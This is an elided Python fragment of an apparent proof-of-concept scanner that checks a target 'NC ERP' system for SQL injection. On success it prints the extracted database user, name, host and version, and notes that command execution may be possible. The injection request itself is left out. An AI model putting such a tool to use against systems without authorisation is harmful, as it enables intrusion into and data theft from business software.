...
def POC_1(target_url):
    console.print('[*]正在检测NC ERP是否存在SQL注入漏洞',style='bold blue')
    ...
    try:
        ...
        if row_1 in response.text and "服务器错误信息：null" not in response.text:
            ...
            console.print("[SUCCESS] 该系统存在SQL漏洞，漏洞响应为:", style='bold green')
            console.print("[INFO] >> 数据库用户为:{}".format(db_user), style='bold green')
            console.print("[INFO] >> 数据库名为:{}".format(db_name), style='bold green')
            console.print("[INFO] >> 数据库主机名为:{}".format(db_host), style='bold green')
            console.print("[INFO] >> 数据库版本为:{}".format(db_vers), style='bold green')
            console.print("[INFO] 该漏洞有可能可执行命令，请到移步到poc/nc_erp_sql.py进行检查确认\n", style='bold green')
            return db_name
        else:
